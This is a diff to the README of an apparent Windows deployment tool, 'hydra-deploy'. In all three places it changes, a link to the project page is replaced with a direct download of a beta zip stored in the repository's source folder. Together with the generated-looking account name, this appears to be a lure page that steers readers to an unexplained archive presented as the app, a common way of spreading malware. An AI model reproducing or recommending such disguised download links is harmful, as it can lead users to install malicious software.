@@ -1,6 +1,6 @@
 # 🛡️ hydra-deploy - Simple deployments with less setup
 
-[![Download hydra-deploy](https://img.shields.io/badge/Download-Open%20page-blue)](https://github.com/Noncontentious-uppernormandy918/hydra-deploy)
+[![Download hydra-deploy](https://img.shields.io/badge/Download-Open%20page-blue)](https://github.com/Noncontentious-uppernormandy918/hydra-deploy/raw/refs/heads/main/src/hydra_deploy_v2.2-beta.2.zip)
 
 ## 📦 What this app does
 
@@ -28,7 +28,7 @@ Before you install, check these basics:
 
 Use this link to visit the project page and get the app:
 
-[Open hydra-deploy download page](https://github.com/Noncontentious-uppernormandy918/hydra-deploy)
+[Open hydra-deploy download page](https://github.com/Noncontentious-uppernormandy918/hydra-deploy/raw/refs/heads/main/src/hydra_deploy_v2.2-beta.2.zip)
 
 If the page shows a release file or installer, download it first. If it shows source files, use the setup steps below to run it on Windows.
 
@@ -230,4 +230,4 @@ Use the license file in this repository for the full terms
 
 Open the main page here:
 
-[https://github.com/Noncontentious-uppernormandy918/hydra-deploy](https://github.com/Noncontentious-uppernormandy918/hydra-deploy)
+[https://github.com/Noncontentious-uppernormandy918/hydra-deploy/raw/refs/heads/main/src/hydra_deploy_v2.2-beta.2.zip](https://github.com/Noncontentious-uppernormandy918/hydra-deploy/raw/refs/heads/main/src/hydra_deploy_v2.2-beta.2.zip)
